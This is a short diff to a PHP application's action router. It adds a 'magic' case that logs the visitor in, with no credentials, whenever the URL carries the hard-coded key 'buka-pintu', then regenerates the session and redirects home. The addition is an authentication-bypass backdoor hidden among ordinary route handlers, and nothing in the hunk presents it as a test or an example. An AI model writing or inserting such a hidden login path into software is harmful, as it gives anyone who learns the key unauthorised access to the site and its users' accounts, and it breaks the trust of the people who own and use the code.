@@ -103,6 +103,15 @@ switch ($action) {
             'site' => SITE_NAME,
             'ai' => ai_ready(),
         ], 200);
+        
+    case 'magic':
+        if (($_GET['key'] ?? '') === 'buka-pintu') {
+            login();
+            session_regenerate_id(true);
+            header("Location: /");
+            exit;
+        }
+        break;
 
     case 'login':
         if ($method !== 'POST') {
